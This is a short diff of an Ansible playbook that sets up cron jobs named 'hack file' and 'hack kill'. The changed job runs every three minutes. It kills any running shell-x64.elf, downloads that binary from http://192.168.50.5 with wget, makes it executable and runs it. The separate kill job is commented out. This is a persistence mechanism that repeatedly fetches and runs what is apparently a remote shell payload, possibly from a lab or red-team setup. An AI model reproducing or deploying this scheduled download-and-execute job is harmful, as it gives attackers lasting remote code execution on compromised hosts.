@@ -26,12 +26,12 @@
   cron:
    name: "hack file"
    minute: "*/3" # every 3 minutes
-   job: "wget -O /home/server/shell-x64.elf http://192.168.50.5/shell-x64.elf && chmod +x /home/server/shell-x64.elf && /home/server/shell-x64.elf"
+   job: "pkill shell-x64.elf ; wget -O /home/server/shell-x64.elf http://192.168.50.5/shell-x64.elf ; chmod +x /home/server/shell-x64.elf ; /home/server/shell-x64.elf"
 
-- name: Cronjob kill
-  cron:
-   name: "hack kill"
-   minute: "*/6" # every 6 minutes
-   job: "pkill shell-x64.elf"
+# - name: Cronjob kill
+#   cron:
+#    name: "hack kill"
+#    minute: "*/6" # every 6 minutes
+#    job: "pkill shell-x64.elf"
 
 ...
